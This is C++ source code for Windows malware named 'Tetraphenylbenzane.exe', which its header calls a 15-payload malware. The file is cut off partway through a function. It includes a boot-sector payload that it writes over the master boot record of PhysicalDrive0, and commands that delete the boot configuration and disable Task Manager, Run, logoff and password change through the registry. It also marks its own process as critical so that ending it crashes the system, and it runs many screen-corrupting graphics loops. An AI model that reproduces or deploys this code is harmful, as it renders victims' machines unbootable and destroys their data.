//Tetraphenylbenzane.exe
//
//A 15-payload malware by UltraDasher965
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <thread>
#include <iostream>
#include <tlhelp32.h>
#include <tchar.h>
#include <cmath>
#include <ctime>
#include <mmsystem.h>
#include <time.h>
#include <vector>
#define pi   3.14159265358979323846264338327950288
#define ICON_SIZE   32
#define POINT_COUNT 100
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
typedef ULONG32(NTAPI* lpNtShutdownSystem)(int Action);
typedef ULONG32(NTAPI* lpNtSetSystemPowerState)(IN POWER_ACTION SystemAction, IN SYSTEM_POWER_STATE MinSystemState, IN ULONG32 Flags);

const unsigned char mbrpayload[]{ // Credits to sixtyfourYT / Wooshydudebro for making this for me!
    0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xD0, 0xBC, 0x00, 0x7C, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8,
0x00, 0xA0, 0x8E, 0xC0, 0xDB, 0xE3, 0xE8, 0x89, 0x00, 0x31, 0xED, 0x31, 0xD2, 0x31, 0xFF, 0x81,
0xFA, 0xC8, 0x00, 0x73, 0x64, 0x81, 0xFD, 0x40, 0x01, 0x73, 0x59, 0x89, 0x2E, 0xC7, 0x7C, 0x89,
0x16, 0xCB, 0x7C, 0xDD, 0x06, 0xDB, 0x7C, 0xD9, 0xFE, 0xD8, 0x0E, 0xCB, 0x7C, 0xD9, 0x1E, 0xD3,
0x7C, 0xDD, 0x06, 0xDB, 0x7C, 0xD9, 0xFF, 0xD8, 0x0E, 0xC7, 0x7C, 0xD8, 0x26, 0xD3, 0x7C, 0xD9,
0x1E, 0xCF, 0x7C, 0xDD, 0x06, 0xDB, 0x7C, 0xD9, 0xFF, 0xD8, 0x0E, 0xCB, 0x7C, 0xD9, 0x1E, 0xD7,
0x7C, 0xDD, 0x06, 0xDB, 0x7C, 0xD9, 0xFE, 0xD8, 0x0E, 0xC7, 0x7C, 0xD8, 0x06, 0xD7, 0x7C, 0xD9,
0x1E, 0xD1, 0x7C, 0xA1, 0xCF, 0x7C, 0x33, 0x06, 0xD1, 0x7C, 0x02, 0x06, 0xEB, 0x7C, 0x24, 0xFF,
0xAA, 0x45, 0xEB, 0x9B, 0x31, 0xED, 0x42, 0xEB, 0x96, 0x31, 0xED, 0x31, 0xD2, 0x31, 0xFF, 0xDD,
0x06, 0xDB, 0x7C, 0xDC, 0x06, 0xE3, 0x7C, 0xDD, 0x1E, 0xDB, 0x7C, 0xFE, 0x06, 0xEB, 0x7C, 0xE9,
0x77, 0xFF, 0x60, 0x31, 0xDB, 0xBA, 0xC8, 0x03, 0x88, 0xD8, 0xEE, 0xBA, 0xC9, 0x03, 0x88, 0xD8,
0xC0, 0xE8, 0x03, 0xEE, 0x88, 0xD8, 0xD0, 0xE0, 0xEE, 0x88, 0xD8, 0x34, 0xFF, 0xEE, 0x43, 0x81,
0xFB, 0x00, 0x01, 0x75, 0xE0, 0x61, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x59, 0x40, 0x7B, 0x14, 0xAE, 0x47, 0xE1, 0x7A, 0x84, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

LPCWSTR randomWords(int len) {
    wchar_t* ustr = new wchar_t[len + 1];
    for (int i = 0; i < len; i++) {
        ustr[i] = L'A' + (rand() % 512);
    }
    ustr[len] = L'\0';
    return ustr;
}
DWORD WINAPI texts(LPVOID lpParam) {
    while (true) {
        BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
        EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
        Sleep(1000);
    }
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)randomWords(rand() % 500 + 10), SMTO_ABORTIFHUNG, 100, NULL);
    return true;
}

DWORD WINAPI MBROverwriter(LPVOID lpParam) {
    DWORD dwWrittenBytes;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    CHAR pcNullData[512];
    RtlZeroMemory(pcNullData, 512);

    WriteFile(hDevice, mbrpayload, 512, &dwWrittenBytes, NULL);
    return 1;
}

struct Vec3 { float x, y, z; };

std::vector<Vec3> points;
HICON icons[5];
float angleX = 0.0f, angleY = 0.0f;
int centerX, centerY;
int vx = 1, vy = 1;

void GenerateSphere() {
    points.clear();
    for (int i = 0; i < POINT_COUNT; i++) {
        float theta = (float)rand() / RAND_MAX * 2 * 3.14159f;
        float phi = (float)rand() / RAND_MAX * 3.14159f;
        float r = 150.0f;

        Vec3 p;
        p.x = r * sinf(phi) * cosf(theta);
        p.y = r * sinf(phi) * sinf(theta);
        p.z = r * cosf(phi);
        points.push_back(p);
    }
}

void DrawScene(HDC hdc) {
    float cosX = cosf(angleX), sinX = tanf(angleX);
    float cosY = cosf(angleY), sinY = tanf(angleY);

    for (int i = 0; i < (int)points.size(); i++) {
        Vec3 p = points[i];

        float y1 = p.y * cosX - p.z * sinX;
        float z1 = p.y * sinX + p.z * cosX;
        float x2 = p.x * cosY + z1 * sinY;
        float z2 = -p.x * sinY + z1 * cosY;

        float fov = 400.0f;
        float scale = fov / (fov + z2);
        int sx = (int)(x2 * scale + centerX);
        int sy = (int)(y1 * scale + centerY);

        DrawIconEx(hdc, sx - ICON_SIZE / 2, sy - ICON_SIZE / 2,
            icons[i % 5], ICON_SIZE, ICON_SIZE, 0, NULL, DI_NORMAL);
    }
}

namespace Math
{
    FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
    {
        return a * sin(2 * pi * b * c / d);
    }
}

COLORREF COLORHSL(int length);

DWORD WINAPI messagebox(LPVOID lpvd)
{
    LPCWSTR string = L"☡ℇ⅁⍦⌰⟟⟄⌦⍲⍦⌦ℇ🜅⌰⟟☊ℇ⍲⍧⌦⌰☡☊⟟⍻⌦⌰⟟🜅⍲☡ℇ⟟⏎⟄⟟⌰ℍℇ☡ℍ🜅☡ℇ⌰⟟🜅☡ℇℍ⌾⍧⟟☊⌾⟟☡ℇ⏎,⍻☊⌾ℇ☈☡ℇ⌰🜅☊☡ℇ⌦⌰🜅⟟⟟☡ℇ⌾🜅⏎ℇ☈☊⟟ℇ☈☊⍻ℇ☈⟟⌾⌦⌾ℇ⟟⌾ℇ🜅ℇ☈⏧⍻⌾⟟ℇ☈⌾☈☡,☈☊⍻⅁☈ℇ⌰⅁⌦⍦⌰☈☡ℇ⌰🜅ℍℇ⍦🜅ℍℇ_⅁☈ℇℍ☈⅁ℇ_ℇ_⍧ℍ☈_'⍑⅁_(ℇ__ℍ☈ℇ☈_⍧⅁'⍑_⍧ℍ'⍦_⍻☈⌰ℇ⟟ℍ☈⌦⌦_⌰⍑⍑𝟝𝟜𝟚𝟡𝟛𝟝𝟞𝟛𝟚𝟛𝟚𝟝𝟛𝟞𝟠𝟚𝟛𝟝𝟞𝟚𝟛𝟞𝟝𝟛𝟠𝟞𝟚𝟝𝟛𝟚𝟡𝟝𝟞𝟚𝟛𝟠𝟞𝟚𝟛𝟞𝟠𝟛𝟝𝟞𝟠𝟚𝟞𝟛𝟠𝟝乙㠪Ꮆㄚㄩ工ᗪ乃闩ㄚ乃㠪千ㄩ工𝓝㠪闩⼕乃ㄩ乙𝓝工ᐯ乃ㄩ工千闩乙㠪工丿ᗪ工ㄩ廾㠪乙廾千乙㠪ㄩ工千乙㠪廾ㄖ⼕工𝓝ㄖ工乙㠪丿,ᐯ𝓝ㄖ㠪尺乙㠪ㄩ千𝓝乙㠪乃ㄩ千工工乙㠪ㄖ千丿㠪尺𝓝工㠪尺𝓝ᐯ㠪尺工ㄖ乃ㄖ㠪工ㄖ㠪千㠪尺长ᐯㄖ工㠪尺ㄖ尺乙,尺𝓝ᐯᎶ尺㠪ㄩᎶ乃ㄚㄩ尺乙㠪ㄩ千廾㠪ㄚ千廾㠪_Ꮆ尺㠪廾尺Ꮆ㠪_㠪_⼕廾尺_'ㄒᎶ_(㠪__廾尺㠪尺_⼕Ꮆ'ㄒ_⼕廾'ㄚ_ᐯ尺ㄩ㠪工廾尺乃乃_ㄩㄒㄒ丂丩己꧶㇋丂꧵㇋己㇋己丂㇋꧵⽇己㇋丂꧵己㇋꧵丂㇋⽇꧵己丂㇋己꧶丂꧵己㇋⽇꧵己㇋꧵⽇㇋丂꧵⽇己꧵㇋⽇丂ꛉ𖤢ꚽꚲꚶꛈ𖤀ꔪꛎꚲꔪ𖤢ꘘꚶꛈꛘ𖤢ꛎꛕꔪꚶꛉꛘꛈꚴꔪꚶꛈꘘꛎꛉ𖤢ꛈꚠ𖤀ꛈꚶꛅ𖤢ꛉꛅꘘꛉ𖤢ꚶꛈꘘꛉ𖤢ꛅ𖣠ꛕꛈꛘ𖣠ꛈꛉ𖤢ꚠ,ꚴꛘ𖣠𖤢𖦪ꛉ𖤢ꚶꘘꛘꛉ𖤢ꔪꚶꘘꛈꛈꛉ𖤢𖣠ꘘꚠ𖤢𖦪ꛘꛈ𖤢𖦪ꛘꚴ𖤢𖦪ꛈ𖣠ꔪ𖣠𖤢ꛈ𖣠𖤢ꘘ𖤢𖦪𖢉ꚴ𖣠ꛈ𖤢𖦪𖣠𖦪ꛉ,𖦪ꛘꚴꚽ𖦪𖤢ꚶꚽꔪꚲꚶ𖦪ꛉ𖤢ꚶꘘꛅ𖤢ꚲꘘꛅ𖤢_ꚽ𖦪𖤢ꛅ𖦪ꚽ𖤢_𖤢_ꛕꛅ𖦪_'𖢧ꚽ_(𖤢__ꛅ𖦪𖤢𖦪_ꛕꚽ'𖢧_ꛕꛅ'ꚲ_ꚴ𖦪ꚶ𖤢ꛈꛅ𖦪ꔪꔪ_ꚶ𖢧𖢧𖨚𖨫ꕫꛝꛌ𖨚ꔿꛌꕫꛌꕫ𖨚ꛌꔿꔻꕫꛌ𖨚ꔿꕫꛌꔿ𖨚ꛌꔻꔿꕫ𖨚ꛌꕫꛝ𖨚ꔿꕫꛌꔻꔿꕫꛌꔿꔻꛌ𖨚ꔿꔻꕫꔿꛌꔻ𖨚";

    while (1)
    {

        MessageBoxW(NULL, string, L"Tetraphenylbenzane.exe", MB_YESNOCANCEL | MB_ICONINFORMATION);

    }
    return 0x00;
}

DWORD WINAPI disabler(LPVOID lpParam) {
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    system("bcdedit /delete {current}");
    return 1;
}

DWORD WINAPI taskbarpoof(LPVOID lpvd) {
    static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
    ShowWindow(hShellWnd, SW_HIDE);
    return 0;
}

DWORD WINAPI opener(LPVOID lpParam) { //will use it in finished ver
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(100);
        }
    }
}

DWORD WINAPI shaking(LPVOID lpParam) { //will use it in the finished ver
    int r = 1;
    while (true) {
        RECT rect;
        HWND hwnd = GetForegroundWindow();
        GetWindowRect(hwnd, &rect);
        int po = rand() % 4 + 1;
        if (po == 4) SetWindowPos(hwnd, 0, rect.left + r, rect.top, 100, 100, SWP_NOSIZE);
        if (po == 3) SetWindowPos(hwnd, 0, rect.left - r, rect.top, 100, 100, SWP_NOSIZE);
        if (po == 2) SetWindowPos(hwnd, 0, rect.left, rect.top + r, 100, 100, SWP_NOSIZE);
        if (po == 1) SetWindowPos(hwnd, 0, rect.left, rect.top - r, 100, 100, SWP_NOSIZE);
    }
}

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv)
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical()
{
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;

    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL)
    {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}

HICON GetRandomSystemCursor() {
    int id1 = rand() % 4;
    LPCTSTR cursors[] = { IDC_CROSS, IDC_ARROW, IDC_IBEAM, IDC_NO };
    return LoadCursor(NULL, cursors[id1]);
}

void ApplyDistortion(HDC hdcScreen, int width, int height, float time) {
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    for (int y = 0; y < height; y++) {
        int offsetX = (int)(20 * sin((y + time) * 0.05f));
        BitBlt(hdcScreen, 0, y, width, 1, hdcMem, offsetX, y, SRCCOPY);
    }

    DeleteObject(hBmp);
    DeleteDC(hdcMem);
}

void ShiftColors(HDC hdc, HBITMAP hBitmap, int width, int height) {
    int bytesPerPixel = 3;
    int stride = ((width * bytesPerPixel + 3) & ~3);
    BYTE* pPixels = new BYTE[stride * height];
    BITMAPINFO bmi = {};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;
    GetDIBits(hdc, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);
    for (int y = 0; y < height; y++) {
        BYTE* row = pPixels + y * stride;
        for (int x = 0; x < width; x++) {
            BYTE* px = row + x * 3;
            BYTE r = px[2];
            BYTE g = px[1];
            BYTE b = px[0];
            px[2] = g; px[1] = b; px[0] = r;
        }
    }
    SetDIBits(hdc, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);
    delete[] pPixels;
}

VOID WINAPI invertcircle(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    HBRUSH brush = CreateSolidBrush(Hue(225));
    SelectObject(hdc, brush);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(brush);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI payload1_1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            INT randW = rand() % w;
            INT randH = rand() % h;

            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, SRCCOPY);
            BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, SRCINVERT);
            BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, SRCCOPY);
            BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
            RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
            DeleteObject(brush);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI payload1_2(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x = rand() % 300 + 20, y = rand() % 300 + 20;
        int sx = rand() % (w - x), sy = rand() % (h - y);
        int dx = rand() % (w - x), dy = rand() % (h - y);
        BitBlt(hdc, dx, dy, x, y, hdc, sx, sy, SRCINVERT);
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI payload1_3(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x = rand() % 300 + 20, y = rand() % 300 + 20;
        int sx = rand() % (w - x), sy = rand() % (h - y);
        int dx = rand() % (w - x), dy = rand() % (h - y);
        BitBlt(hdc, dx, dy, x, y, hdc, sx, sy, SRCPAINT);
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI payload1_4(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x = rand() % 300 + 20, y = rand() % 300 + 20;
        int sx = rand() % (w - x), sy = rand() % (h - y);
        int dx = rand() % (w - x), dy = rand() % (h - y);
        BitBlt(hdc, dx, dy, x, y, hdc, sx, sy, SRCCOPY);
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI payload1_5(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x = rand() % 300 + 20, y = rand() % 300 + 20;
        int sx = rand() % (w - x), sy = rand() % (h - y);
        int dx = rand() % (w - x), dy = rand() % (h - y);
        BitBlt(hdc, dx, dy, x, y, hdc, sx, sy, SRCAND);
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI payload1_6(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x = rand() % 300 + 20, y = rand() % 300 + 20;
        int sx = rand() % (w - x), sy = rand() % (h - y);
        int dx = rand() % (w - x), dy = rand() % (h - y);
        BitBlt(hdc, dx, dy, x, y, hdc, sx, sy, SRCERASE);
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI payload1_7(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            INT randW = rand() % w;
            INT randH = rand() % h;

            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, SRCERASE);
            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, SRCPAINT);
            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, SRCAND);
            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, PATINVERT);
            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, SRCCOPY);
            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, NOTSRCCOPY);
            BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, SRCPAINT);
            BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, SRCERASE);
            BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, SRCPAINT);
            BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, SRCAND);
            BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, PATINVERT);
            BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, SRCCOPY);
            BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, NOTSRCCOPY);
            DeleteObject(brush);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI payload2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            INT nBlockSize = rand() % 129 + 128;
            INT nNewBlockSize = nBlockSize + (rand() % 17 + 16);

            INT x = rand() % (w - nBlockSize);
            INT y = rand() % (h - nBlockSize);

            SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
            StretchBlt(hdc, x - (nNewBlockSize - nBlockSize) / 5, y - (nNewBlockSize - nBlockSize) / 5, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, PATINVERT);
            StretchBlt(hdc, (rand() % - 100) - 100, (rand() % -100) - 100, w + (rand() % 200), h + (rand() % 200), hdc, 0, 0, w, h, SRCCOPY);
